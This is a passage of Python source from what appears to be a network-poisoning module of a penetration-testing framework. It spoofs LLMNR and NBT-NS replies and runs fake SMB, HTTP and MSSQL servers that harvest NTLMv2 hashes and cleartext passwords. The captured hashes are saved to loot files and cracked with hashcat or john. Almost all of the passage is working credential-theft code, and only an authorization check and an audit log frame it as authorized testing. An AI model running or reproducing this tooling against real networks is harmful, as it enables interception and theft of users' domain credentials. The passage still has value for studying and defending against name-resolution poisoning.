        return buf.decode("utf-8", errors="replace").rstrip("\r\n")


# =====================================================================
# MSSQL listener (TCP/1433) — SQL auth + NTLM
# =====================================================================

class MSSQLListener(_BaseListener):
    default_port = MSSQL_PORT
    name = "MSSQL"

    def handle(self, client: socket.socket, addr):
        username = ""
        domain = ""
        password = ""
        ntlm_blob = b""

        for _ in range(6):
            pkt = self._recv_tds(client)
            if pkt is None:
                break

            msg_type = pkt[0]

            if msg_type == 0x12:
                try:
                    client.sendall(self._build_prelogin_response())
                except Exception:
                    break

            elif msg_type == 0x10:
                username, domain, password, ntlm_blob = \
                    self._parse_login7(pkt[1])
                break

        if not (username or password or ntlm_blob):
            return

        if ntlm_blob:
            cap = Capture(
                kind="mssql-ntlm",
                ts=datetime.now(timezone.utc).isoformat(),
                src_ip=addr[0],
                src_port=addr[1],
                username=username,
                domain=domain,
                auth_blob=base64.b64encode(ntlm_blob).decode("ascii"),
                note=(f"MSSQL NTLM auth from {addr[0]}: "
                      f"{domain}\\{username}"),
            )
            self.state.record(cap)
            with PRINT_LOCK:
                success(f"[MSSQL/NTLM] {addr[0]} → "
                        f"{domain}\\{username}")
        else:
            cap = Capture(
                kind="mssql-sql-auth",
                ts=datetime.now(timezone.utc).isoformat(),
                src_ip=addr[0],
                src_port=addr[1],
                username=username,
                password=password,
                note=(f"MSSQL SQL auth from {addr[0]}: "
                      f"{username!r} / {password!r}"),
            )
            self.state.record(cap)
            with PRINT_LOCK:
                success(f"[MSSQL/SQL] {addr[0]} → "
                        f"{username!r} : {password!r}")

        try:
            client.sendall(self._build_login_failure())
        except Exception:
            pass

    @staticmethod
    def _recv_tds(sock: socket.socket) -> tuple[int, bytes] | None:
        try:
            header = b""
            while len(header) < 8:
                chunk = sock.recv(8 - len(header))
                if not chunk:
                    return None
                header += chunk
        except socket.timeout:
            return None

        msg_type = header[0]
        length = struct.unpack(">H", header[2:4])[0]
        if length < 8 or length > 65536:
            return None

        payload = b""
        remaining = length - 8
        while remaining > 0:
            try:
                chunk = sock.recv(remaining)
            except socket.timeout:
                return None
            if not chunk:
                return None
            payload += chunk
            remaining -= len(chunk)

        return msg_type, payload

    @staticmethod
    def _parse_login7(payload: bytes) -> tuple[str, str, str, bytes]:
        if len(payload) < 94:
            return "", "", "", b""

        def read_u16(off: int) -> int:
            if off + 2 > len(payload):
                return 0
            return struct.unpack("<H", payload[off:off + 2])[0]

        user_off = read_u16(0x28)
        user_len = read_u16(0x2A)
        pass_off = read_u16(0x2C)
        pass_len = read_u16(0x2E)

        option_flags2 = payload[0x19] if len(payload) > 0x19 else 0
        integrated_security = bool(option_flags2 & 0x80)

        username = ""
        if user_off > 0 and user_off + user_len <= len(payload):
            try:
                username = payload[user_off:user_off + user_len].decode(
                    "utf-16-le", errors="replace")
            except Exception:
                pass

        ntlm_blob = b""
        if integrated_security:
            idx = payload.find(b"NTLMSSP\x00")
            if idx >= 0:
                ntlm_blob = payload[idx:]

        password = ""
        if not integrated_security and pass_off > 0 and \
                pass_off + pass_len <= len(payload):
            try:
                raw = payload[pass_off:pass_off + pass_len]
                password = MSSQLListener._deobfuscate_password(raw)
            except Exception:
                pass

        return username, "", password, ntlm_blob

    @staticmethod
    def _deobfuscate_password(raw: bytes) -> str:
        deobfuscated = bytearray()
        for b in raw:
            swapped = ((b << 4) | (b >> 4)) & 0xFF
            deobfuscated.append(swapped ^ 0xA5)
        try:
            return bytes(deobfuscated).decode("utf-16-le",
                                                errors="replace")
        except Exception:
            return bytes(deobfuscated).decode("utf-8",
                                                errors="replace")

    @staticmethod
    def _build_prelogin_response() -> bytes:
        payload = (
            b"\x00\x00\x00\x00\x00\x00"
            b"\x01\x06\x00\x01"
            b"\x02\x00\x00\x00"
            b"\x03\x00\x00\x00"
            b"\x04\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x02"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        header = struct.pack(">BBHHBB",
                             0x04, 0x01, len(payload) + 8,
                             0, 0, 0)
        return header + payload

    @staticmethod
    def _build_login_failure() -> bytes:
        msg = "Login failed for user".encode("utf-16-le")
        error = (
            b"\xAA" + struct.pack("<H", 6 + 1 + 1 + 2 + len(msg) + 2 + 1)
            + struct.pack("<I", 18456)
            + b"\x01"
            + b"\x0E"
            + struct.pack("<H", len(msg))
            + msg
            + b"\x00\x00"
            + b"\x00"
        )
        header = struct.pack(">BBHHBB",
                             0x04, 0x01, len(error) + 8,
                             0, 0, 0)
        return header + error


# =====================================================================
# NTLMSSP builders + parsers
# =====================================================================

def _build_ntlm_type2(server_challenge: bytes) -> bytes:
    assert len(server_challenge) == 8
    target_name = b"WORKGROUP"
    header_len = 48
    target_offset = header_len + 16
    payload = target_name
    msg = (
        b"NTLMSSP\x00"
        + struct.pack("<I", 2)
        + struct.pack("<HHI", len(target_name), len(target_name),
                      target_offset)
        + struct.pack("<I", 0x00888205)
        + server_challenge
        + b"\x00" * 8
        + struct.pack("<HHI", 0, 0, 0)
        + b"\x00" * 8
        + payload
    )
    return msg


def _parse_ntlm_type3(type3: bytes, server_challenge: bytes) -> dict | None:
    try:
        if len(type3) < 64:
            return None
        if type3[:8] != b"NTLMSSP\x00":
            return None
        if struct.unpack("<I", type3[8:12])[0] != 3:
            return None

        def read_sec_buf(offset):
            length, _, buf_off = struct.unpack(
                "<HHI", type3[offset:offset + 8])
            return length, buf_off

        lm_len, lm_off = read_sec_buf(12)
        nt_len, nt_off = read_sec_buf(20)
        dom_len, dom_off = read_sec_buf(28)
        usr_len, usr_off = read_sec_buf(36)

        lm_resp = type3[lm_off:lm_off + lm_len]
        nt_resp = type3[nt_off:nt_off + nt_len]
        domain = type3[dom_off:dom_off + dom_len].decode(
            "utf-16-le", errors="ignore")
        username = type3[usr_off:usr_off + usr_len].decode(
            "utf-16-le", errors="ignore")

        if not username:
            return None

        if len(nt_resp) >= 16:
            nt_proof_str = nt_resp[:16]
            blob = nt_resp[16:]
            hash_str = (
                f"{username}::{domain}:"
                f"{server_challenge.hex()}:"
                f"{nt_proof_str.hex()}:"
                f"{blob.hex()}"
            )
        else:
            hash_str = (
                f"{username}::{domain}:"
                f"{lm_resp.hex()}:{nt_resp.hex()}:"
                f"{server_challenge.hex()}"
            )

        return {
            "username": username,
            "domain": domain or ".",
            "ntlm_response": nt_resp,
            "ntlmv2_hash": hash_str,
        }
    except Exception:
        return None


# =====================================================================
# SMB listener (TCP/445) — capture NTLM over SMB
# =====================================================================

class SMBListener:
    """Minimal SMB server that captures NTLM authentication attempts."""

    def __init__(self, state: PoisonState, port=SMB_PORT, verbose=False):
        self.state = state
        self.port = port
        self.verbose = verbose
        self._server = None
        self._running = False

    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.port))
            sock.listen(16)
            sock.settimeout(1.0)
            self._server = sock
            self._running = True
            info(f"poison: SMB listener on 0.0.0.0:{self.port}")
        except PermissionError:
            error(f"poison: cannot bind {self.port}/tcp — "
                  f"need Administrator privileges")
            return False
        except OSError as e:
            error(f"poison: cannot bind {self.port}/tcp: {e}")
            return False

        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running and not self.state.shutdown.is_set():
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle_client,
                             args=(client, addr), daemon=True).start()

    def _handle_client(self, client, addr):
        client.settimeout(5.0)
        try:
            self._smb_handshake(client, addr[0])
        except Exception as e:
            if self.verbose:
                info(f"poison: SMB handler error from {addr[0]}: "
                     f"{type(e).__name__}: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass

    def _smb_handshake(self, client, src_ip):
        data = self._recv_nbss(client)
        if not data or not data.startswith(b"\xfeSMB"):
            return

        self._send_nbss(client, _smb2_negotiate_response())

        data = self._recv_nbss(client)
        if not data or not data.startswith(b"\xfeSMB"):
            return
        type1 = _extract_ntlmssp(data)
        if not type1 or type1[:8] != b"NTLMSSP\x00":
            return

        server_challenge = os.urandom(8)
        type2 = _build_ntlm_type2(server_challenge)
        self._send_nbss(client, _smb2_session_setup_response(type2))

        data = self._recv_nbss(client)
        if not data:
            return
        type3 = _extract_ntlmssp(data)
        if not type3 or type3[:8] != b"NTLMSSP\x00":
            return
        if type3[8] != 0x03:
            return

        parsed = _parse_ntlm_type3(type3, server_challenge)
        if not parsed:
            return

        if self.state.already_captured(src_ip):
            return
        self.state.mark_captured(src_ip)

        username = parsed["username"]
        domain = parsed["domain"]
        ntlmv2 = parsed["ntlmv2_hash"]

        cap = Capture(
            kind="ntlm-hash",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=src_ip,
            username=username,
            domain=domain,
            challenge=server_challenge,
            ntlm_response=parsed["ntlm_response"],
            ntlmv2_hash=ntlmv2,
            raw_ntlm_type3=type3,
            note=(f"Captured NTLMv2 hash for {domain}\\{username} "
                  f"from {src_ip}"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[NTLM] {src_ip} → {domain}\\{username}")
            print(f"       {ntlmv2}")

        if self.state.workspace:
            try:
                p = self.state.workspace.hashes_path
                p.parent.mkdir(parents=True, exist_ok=True)
                with p.open("a", encoding="utf-8") as f:
                    f.write(f"# SMB {src_ip} "
                            f"{datetime.now(timezone.utc).isoformat()}\n")
                    f.write(f"{ntlmv2}\n")
            except Exception as e:
                warn(f"could not write hash file: {e}")

        self._send_nbss(client, _smb2_session_setup_failed())

    @staticmethod
    def _recv_nbss(client) -> bytes:
        try:
            header = _recv_exact(client, 4)
            if not header:
                return b""
            length = int.from_bytes(header[1:4], "big")
            return _recv_exact(client, length)
        except Exception:
            return b""

    @staticmethod
    def _send_nbss(client, payload: bytes):
        try:
            header = b"\x00" + len(payload).to_bytes(3, "big")
            client.sendall(header + payload)
        except Exception:
            pass


def _recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return b""
        buf += chunk
    return buf


def _smb2_header(command: int, status: int = 0, flags: int = 0x0001,
                  message_id: int = 0, tree_id: int = 0,
                  session_id: int = 0) -> bytes:
    return struct.pack(
        "<4sHHIHHI I Q I I Q Q",
        b"\xfeSMB", 64, 0, status, command, 0, flags, 0,
        message_id, 0, tree_id, session_id,
    ) + b"\x00" * 16


def _smb2_negotiate_response() -> bytes:
    header = _smb2_header(command=0x0000)
    body = struct.pack(
        "<HHHH I 16s I I I I H H I Q",
        65, 0x0001, 0x0202, 0, 0,
        os.urandom(16),
        0, 0, 0, 0, 0, 128, 0, 0,
    )
    sec_blob = b"\x00" * 128
    return header + body + sec_blob


def _smb2_session_setup_response(ntlm_type2: bytes) -> bytes:
    header = _smb2_header(command=0x0001, status=0xC0000016)
    body = struct.pack("<HH H I H", 9, 0, 0, 72, len(ntlm_type2))
    return header + body + ntlm_type2


def _smb2_session_setup_failed() -> bytes:
    header = _smb2_header(command=0x0001, status=0xC000006D)
    body = struct.pack("<HH H I H", 9, 0, 0, 72, 0)
    return header + body


def _extract_ntlmssp(smb2_packet: bytes) -> bytes:
    sig = b"NTLMSSP\x00"
    idx = smb2_packet.find(sig)
    if idx < 0:
        return b""
    return smb2_packet[idx:]


# =====================================================================
# HTTP listener (TCP/80) — NTLM + Basic auth
# =====================================================================

def _parse_basic_auth(header_value: bytes) -> tuple[str, str]:
    """Extract (user, pass) from an 'Authorization: Basic ...' header."""
    try:
        b64 = header_value.split(b" ", 1)[1]
        decoded = base64.b64decode(b64).decode("utf-8", errors="replace")
        if ":" in decoded:
            user, pw = decoded.split(":", 1)
            return user, pw
    except Exception:
        pass
    return "", ""


class HTTPListener:
    """HTTP server that returns 401 with WWW-Authenticate: NTLM.
    Also captures Basic auth when clients send it."""

    _CHALLENGE = os.urandom(8)

    def __init__(self, state: PoisonState, port=HTTP_PORT, verbose=False):
        self.state = state
        self.port = port
        self.verbose = verbose
        self._server = None
        self._running = False

    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.port))
            sock.listen(16)
            sock.settimeout(1.0)
            self._server = sock
            self._running = True
            info(f"poison: HTTP listener on 0.0.0.0:{self.port}")
        except PermissionError:
            warn(f"poison: cannot bind {self.port}/tcp — need Administrator")
            return False
        except OSError as e:
            warn(f"poison: cannot bind {self.port}/tcp: {e}")
            return False

        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running and not self.state.shutdown.is_set():
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(client, addr[0]),
                             daemon=True).start()

    def _handle(self, client, src_ip):
        client.settimeout(5.0)
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = client.recv(4096)
                if not chunk:
                    return
                data += chunk
                if len(data) > 65536:
                    break

            auth_hdr = _find_header(data, b"Authorization")

            # --- Basic auth check ---
            if auth_hdr and b"Basic " in auth_hdr:
                user, pw = _parse_basic_auth(auth_hdr)
                if user or pw:
                    cap = Capture(
                        kind="http-basic",
                        ts=datetime.now(timezone.utc).isoformat(),
                        src_ip=src_ip,
                        username=user,
                        password=pw,
                        note=(f"HTTP Basic auth from {src_ip}: "
                              f"{user!r} / {pw!r}"),
                    )
                    self.state.record(cap)
                    with PRINT_LOCK:
                        success(f"[HTTP/Basic] {src_ip} → "
                                f"{user!r} : {pw!r}")
                    # Respond with 403 so the client stops retrying
                    client.sendall(
                        b"HTTP/1.1 403 Forbidden\r\n"
                        b"Content-Length: 0\r\n"
                        b"Connection: close\r\n"
                        b"\r\n"
                    )
                    return

            # --- NTLM check ---
            if auth_hdr and b"NTLM " in auth_hdr:
                b64 = auth_hdr.split(b"NTLM ", 1)[1].strip()
                try:
                    ntlm_blob = base64.b64decode(b64)
                except Exception:
                    ntlm_blob = b""
                if ntlm_blob.startswith(b"NTLMSSP\x00"):
                    type_num = struct.unpack("<I", ntlm_blob[8:12])[0]
                    if type_num == 3:
                        parsed = _parse_ntlm_type3(
                            ntlm_blob, self._CHALLENGE)
                        if parsed and not self.state.already_captured(src_ip):
                            self.state.mark_captured(src_ip)
                            cap = Capture(
                                kind="ntlm-hash",
                                ts=datetime.now(timezone.utc).isoformat(),
                                src_ip=src_ip,
                                username=parsed["username"],
                                domain=parsed["domain"],
                                challenge=self._CHALLENGE,
                                ntlm_response=parsed["ntlm_response"],
                                ntlmv2_hash=parsed["ntlmv2_hash"],
                                raw_ntlm_type3=ntlm_blob,
                                note=(f"Captured HTTP NTLMv2 hash for "
                                      f"{parsed['domain']}\\"
                                      f"{parsed['username']} from {src_ip}"),
                            )
                            self.state.record(cap)
                            with PRINT_LOCK:
                                success(f"[HTTP-NTLM] {src_ip} → "
                                        f"{parsed['domain']}\\"
                                        f"{parsed['username']}")
                                print(f"       {parsed['ntlmv2_hash']}")
                            if self.state.workspace:
                                try:
                                    p = self.state.workspace.hashes_path
                                    p.parent.mkdir(parents=True,
                                                    exist_ok=True)
                                    with p.open("a", encoding="utf-8") as f:
                                        f.write(
                                            f"# HTTP {src_ip} "
                                            f"{datetime.now(timezone.utc).isoformat()}\n"
                                        )
                                        f.write(
                                            f"{parsed['ntlmv2_hash']}\n")
                                except Exception:
                                    pass
                            return

            # --- No usable auth; send 401 challenge ---
            challenge_b64 = base64.b64encode(
                _build_ntlm_type2(self._CHALLENGE)).decode()
            response = (
                b"HTTP/1.1 401 Unauthorized\r\n"
                b"Server: Microsoft-IIS/10.0\r\n"
                b"WWW-Authenticate: NTLM\r\n"
                b"WWW-Authenticate: NTLM " + challenge_b64.encode() + b"\r\n"
                b"Content-Length: 0\r\n"
                b"Connection: close\r\n"
                b"\r\n"
            )
            client.sendall(response)
        except Exception as e:
            if self.verbose:
                info(f"poison: HTTP handler error from {src_ip}: "
                     f"{type(e).__name__}: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass


def _find_header(request: bytes, header_name: bytes) -> bytes:
    for line in request.split(b"\r\n"):
        if line.lower().startswith(header_name.lower() + b":"):
            return line.split(b":", 1)[1].strip()
    return b""


# =====================================================================
# LLMNR handler
# =====================================================================

def _parse_llmnr_query(pkt) -> tuple[str, int] | None:
    if not pkt.haslayer(UDP) or pkt[UDP].dport != LLMNR_PORT:
        return None
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return None
    dns = pkt[DNS]
    if dns.qdcount < 1:
        return None
    try:
        qname_raw = bytes(dns.qd.qname)
    except Exception:
        return None
    name = _decode_dns_name(qname_raw)
    return name, dns.qd.qtype


def _build_llmnr_poison(query_pkt, our_ip: str) -> bytes | None:
    try:
        dns = query_pkt[DNS]
        resp = (
            IP(dst=query_pkt[IP].src, src=our_ip)
            / UDP(sport=LLMNR_PORT, dport=query_pkt[UDP].sport)
            / DNS(
                id=dns.id,
                qr=1, opcode=0, aa=1, rd=1, ra=1, z=0, rcode=0,
                qdcount=1, ancount=1, nscount=0, arcount=0,
                qd=DNSQR(qname=dns.qd.qname, qtype=dns.qd.qtype,
                         qclass=1),
                an=DNSRR(
                    rrname=dns.qd.qname,
                    type=1,
                    rclass=1,
                    ttl=30,
                    rdata=our_ip,
                ),
            )
        )
        return bytes(resp)
    except Exception as e:
        note_error("llmnr_build", f"{type(e).__name__}: {e}")
        return None


def _handle_llmnr(pkt, state: PoisonState):
    parsed = _parse_llmnr_query(pkt)
    if not parsed:
        return
    name, qtype = parsed
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    cap = Capture(
        kind="llmnr-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type=f"LLMNR/type{qtype}",
        note=f"LLMNR query from {src_ip} for {name!r}",
    )

    if state.active and _should_poison(name):
        if not state.already_poisoned(name, src_ip):
            resp = _build_llmnr_poison(pkt, state.my_ip)
            if resp:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET,
                                     socket.SO_REUSEADDR, 1)
                    sock.sendto(resp, (src_ip, pkt[UDP].sport))
                    sock.close()
                    cap.poisoned = True
                    cap.note += f" → poisoned with {state.my_ip}"
                    state.mark_poisoned(name, src_ip)
                    _audit_log(state, f"LLMNR poison: {src_ip} asked for "
                                       f"{name!r}, replied with "
                                       f"{state.my_ip}")
                except Exception as e:
                    note_error("llmnr_send", f"{type(e).__name__}: {e}")

    state.record(cap)


# =====================================================================
# NBT-NS handler
# =====================================================================

def _parse_nbns_packet(pkt):
    if not pkt.haslayer(UDP) or pkt[UDP].dport != NBNS_PORT:
        return None
    try:
        raw = bytes(pkt[UDP].payload)
    except Exception:
        return None
    if len(raw) < 12:
        return None

    try:
        (trn_id, flags, qd, an, ns, ar) = struct.unpack(">HHHHHH", raw[:12])
    except struct.error:
        return None

    qr = (flags >> 15) & 1
    result = {
        "id": trn_id,
        "qr": qr,
        "qname": "",
        "qtype": 0,
        "qclass": 0,
        "raw": raw,
    }

    if qr == 0 and qd >= 1 and len(raw) >= 12 + 34 + 4:
        qname_raw = raw[12:12 + 34]
        result["qname"] = _decode_nbns_name(qname_raw)
        result["qtype"], result["qclass"] = struct.unpack(
            ">HH", raw[12 + 34:12 + 34 + 4])
    return result


def _build_nbns_response(trn_id: int, qname_encoded: bytes,
                          our_ip: str) -> bytes:
    flags = 0x8400
    header = struct.pack(">HHHHHH", trn_id, flags, 0, 1, 0, 0)

    rr = qname_encoded[:34]
    rr += struct.pack(">HHIH", 0x0020, 0x0001, 30, 6)
    rr += struct.pack(">H", 0x0000)
    rr += socket.inet_aton(our_ip)

    return header + rr


def _handle_nbns(pkt, state: PoisonState):
    parsed = _parse_nbns_packet(pkt)
    if not parsed or parsed["qr"] != 0:
        return

    name = parsed["qname"]
    if not name:
        return
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    cap = Capture(
        kind="nbns-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type="NBT-NS",
        note=f"NBT-NS query from {src_ip} for {name!r}",
    )

    if state.active and _should_poison(name):
        if not state.already_poisoned(name, src_ip):
            qname_encoded = parsed["raw"][12:12 + 34]
            resp = _build_nbns_response(parsed["id"], qname_encoded,
                                         state.my_ip)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.sendto(resp, (src_ip, pkt[UDP].sport))
                sock.close()
                cap.poisoned = True
                cap.note += f" → poisoned with {state.my_ip}"
                state.mark_poisoned(name, src_ip)
                _audit_log(state, f"NBT-NS poison: {src_ip} asked for "
                                   f"{name!r}, replied with "
                                   f"{state.my_ip}")
            except Exception as e:
                note_error("nbns_send", f"{type(e).__name__}: {e}")

    state.record(cap)


# =====================================================================
# mDNS handler (passive only)
# =====================================================================

def _handle_mdns(pkt, state: PoisonState):
    if not pkt.haslayer(UDP) or pkt[UDP].dport != MDNS_PORT:
        return
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return
    dns = pkt[DNS]
    if dns.qdcount < 1:
        return
    try:
        name_raw = bytes(dns.qd.qname)
    except Exception:
        return
    name = _decode_dns_name(name_raw)
    if not name or name.startswith("_"):
        return
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    state.record(Capture(
        kind="mdns-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type="mDNS",
        note=f"mDNS query from {src_ip} for {name!r}",
    ))


# =====================================================================
# Sniffer loop
# =====================================================================

async def _sniff_loop(state: PoisonState, duration: float, verbose: bool):
    def handle(pkt):
        try:
            if not pkt.haslayer(UDP):
                return
            dport = pkt[UDP].dport
            if dport == LLMNR_PORT:
                _handle_llmnr(pkt, state)
            elif dport == NBNS_PORT:
                _handle_nbns(pkt, state)
            elif dport == MDNS_PORT:
                _handle_mdns(pkt, state)
        except Exception:
            pass

    sniffer = AsyncSniffer(
        store=False,
        prn=handle,
        filter=f"udp and (port {LLMNR_PORT} or port {NBNS_PORT} "
               f"or port {MDNS_PORT})",
    )
    try:
        sniffer.start()
    except Exception as e:
        error(f"poison: could not start sniffer: {type(e).__name__}: {e}")
        return
    try:
        await asyncio.sleep(duration)
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass


# =====================================================================
# Store integration
# =====================================================================

def _persist(state: PoisonState, store):
    if not store:
        return

    hostnames_by_ip: dict[str, set[str]] = {}

    for cap in state.captures:
        if cap.kind == "ntlm-hash":
            store.add_finding(cap.as_finding())
            store.add_credential(
                target=cap.src_ip,
                username=cap.username,
                password=None,
                hash=cap.ntlmv2_hash,
                source="poison-ntlm",
                notes=f"domain={cap.domain}",
            )
        elif cap.kind in ("ftp-cred", "pop3-cred", "imap-cred",
                           "smtp-cred", "http-basic", "ldap-bind",
                           "mssql-sql-auth"):
            store.add_finding(cap.as_finding())
            store.add_credential(
                target=cap.src_ip,
                username=cap.username,
                password=cap.password,
                hash=None,
                source=f"poison-{cap.kind.split('-')[0]}",
                notes=cap.kind,
            )
        elif cap.kind == "mssql-ntlm":
            store.add_finding(cap.as_finding())
            store.add_credential(
                target=cap.src_ip,
                username=cap.username,
                password=None,
                hash=cap.auth_blob,
                source="poison-mssql-ntlm",
                notes=f"domain={cap.domain}",
            )
        elif cap.kind == "kerberos-asreq":
            store.add_finding(cap.as_finding())
        elif cap.kind in ("wpad-request", "dhcpv6-solicit", "dns-query"):
            if cap.src_ip:
                hostnames_by_ip.setdefault(cap.src_ip, set()).add(
                    cap.query_name)
            store.add_finding(cap.as_finding())
        elif cap.kind.endswith("-query"):
            if cap.src_ip:
                hostnames_by_ip.setdefault(cap.src_ip, set()).add(
                    cap.query_name)
            store.add_finding(cap.as_finding())

    for ip, names in hostnames_by_ip.items():
        store.upsert_host(
            ip,
            hostname=next(iter(names)) if names else None,
            discovery="poison-passive" if not state.active else "poison",
            tags=[f"queried:{n}" for n in list(names)[:5]],
        )


# =====================================================================
# Hash cracking
# =====================================================================

def _crack_hashes(state: PoisonState, wordlist: str | None,
                  verbose: bool = False) -> dict:
    cracked: dict[str, str] = {}

    hashes = [c.ntlmv2_hash for c in state.captures
              if c.kind == "ntlm-hash" and c.ntlmv2_hash]
    if not hashes:
        return cracked

    if not wordlist:
        info("poison: no wordlist provided; skipping cracking")
        return cracked

    wordlist_path = Path(wordlist)
    if not wordlist_path.exists():
        warn(f"poison: wordlist not found: {wordlist}")
        return cracked

    hc = shutil.which("hashcat")
    jn = shutil.which("john")

    if hc:
        info(f"poison: cracking {len(hashes)} hash(es) with hashcat")
        tmp = (state.workspace.loot_dir / "hashes_for_crack.txt"
               if state.workspace else Path("hashes_for_crack.txt"))
        tmp.parent.mkdir(parents=True, exist_ok=True)
        tmp.write_text("\n".join(hashes), encoding="utf-8")
        try:
            subprocess.run(
                [hc, "-m", "5600", "-a", "0", str(tmp), str(wordlist_path),
                 "--potfile-path", str(tmp) + ".pot", "--quiet"],
                capture_output=True, text=True, timeout=600,
            )
        except Exception as e:
            warn(f"poison: hashcat failed: {e}")
            return cracked

        pot = Path(str(tmp) + ".pot")
        if pot.exists():
            for line in pot.read_text(encoding="utf-8").splitlines():
                if ":" in line:
                    h, _, pw = line.rpartition(":")
                    if h in hashes:
                        cracked[h] = pw
        for h in hashes:
            if h in cracked:
                success(f"[CRACKED] {h[:50]}… → {cracked[h]}")
    elif jn:
        info(f"poison: cracking {len(hashes)} hash(es) with john")
        tmp = Path("hashes_for_john.txt")
        tmp.write_text("\n".join(hashes), encoding="utf-8")
        try:
            subprocess.run(
                [jn, "--format=netntlmv2", f"--wordlist={wordlist_path}",
                 str(tmp)],
                capture_output=True, text=True, timeout=600,
            )
            show = subprocess.run(
                [jn, "--show", "--format=netntlmv2", str(tmp)],
                capture_output=True, text=True, timeout=30,
            )
            for line in show.stdout.splitlines():
                if ":" in line:
                    h, _, pw = line.rpartition(":")
                    if h in hashes:
                        cracked[h] = pw
        except Exception as e:
            warn(f"poison: john failed: {e}")
    else:
        warn("poison: no hashcat or john on PATH; skipping cracking")

    return cracked


# =====================================================================
# Top-level entry point
# =====================================================================

async def run(duration=60, active=False, authorized_by=None,
              interface=None, verbose=False, wordlist=None,
              store=None, workspace=None, smb_port=SMB_PORT,
              http_port=HTTP_PORT,
              enable_wpad=True, enable_dhcpv6=True, enable_dns=True,
              enable_ldap=True, enable_kerberos=True, enable_ftp=True,
              enable_smtp=True, enable_pop3=True, enable_imap=True,
              enable_mssql=True,
              passive_only_ok=True):
    """Run the poison capture session."""
    state = PoisonState()
    state.workspace = workspace
    state.start_time = time.time()

    if interface:
        iface = interface
        my_ip = ""
        my_ipv6 = ""
        my_mac = "00:00:00:00:00:00"
        try:
            my_ip = scapy_conf.route.route("0.0.0.0")[1]
        except Exception:
            pass
        try:
            my_mac = get_if_hwaddr(iface)
        except Exception:
            pass
        try:
            import psutil
            for a in psutil.net_if_addrs().get(iface, []):
                if getattr(a, "family", None) == socket.AF_INET6:
                    v6 = a.address.split("%")[0]
                    if not v6.startswith("fe80"):
                        my_ipv6 = v6
                        break
        except Exception:
            pass
    else:
        iface, my_ip, my_ipv6, my_mac = _pick_iface()

    if not iface:
        error("poison: could not determine default interface")
        return {}

    state.iface = iface
    state.my_ip = my_ip or ""
    state.my_ipv6 = my_ipv6 or ""
    state.my_mac = my_mac or "00:00:00:00:00:00"

    info(f"poison: interface={iface} ip={state.my_ip} "
         f"ipv6={state.my_ipv6 or '(none)'} mac={state.my_mac}")

    if active:
        allowed, reason = _check_authorization(authorized_by or "")
        if allowed:
            state.active = True
            state.authorized_by = authorized_by
            info(f"poison: ACTIVE mode enabled, authorized by "
                 f"{authorized_by!r}")
            _audit_log(state,
                       f"session start: active mode, duration={duration}s, "
                       f"authorized_by={authorized_by!r}, iface={iface}, "
                       f"our_ip={my_ip}")
            warn("poison: ACTIVE MODE — sending LLMNR/NBT-NS poison "
                 "responses. This is an attack.")
        else:
            if passive_only_ok:
                warn(f"poison: active mode refused ({reason}); "
                     f"falling back to passive")
                state.active = False
            else:
                error(f"poison: active mode refused: {reason}")
                return {}

    # Start listeners (only in active mode)
    listeners: list = []
    if state.active:
        # --- Existing listeners ---
        smb = SMBListener(state, port=smb_port, verbose=verbose)
        if smb.start():
            listeners.append(smb)
        else:
            warn("poison: SMB listener failed; NTLM-over-SMB disabled")

        http = HTTPListener(state, port=http_port, verbose=verbose)
        if http.start():
            listeners.append(http)
        else:
            warn("poison: HTTP listener failed; NTLM-over-HTTP disabled")

        # --- New listeners ---
        if enable_wpad:
            wpad = WPADListener(state, port=http_port, verbose=verbose)
            # Note: WPAD and HTTP both want port 80. Only one can bind.
            # We start WPAD first if enable_wpad is True and http_port
            # is 80 — the HTTP listener will fail to bind and we warn.
            # The user is expected to pick one or move HTTP to another
            # port.
            if wpad.start():
                listeners.append(wpad)
            else:
                warn("poison: WPAD listener failed to bind")

        if enable_dns:
